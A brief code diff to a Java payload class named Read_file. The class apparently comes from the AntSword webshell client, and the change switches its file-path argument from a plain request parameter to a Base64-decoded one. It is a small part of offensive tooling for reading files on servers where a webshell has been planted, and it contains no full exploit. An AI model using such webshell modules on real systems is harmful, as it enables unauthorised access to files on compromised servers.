@@ -10,7 +10,7 @@ import java.io.InputStreamReader;
 public class Read_file extends Template {
     @Override
     public String run() throws Exception {
-        String z1 = getParam("antswordargpath");
+        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
         return ReadFileCode(z1);
 
     }
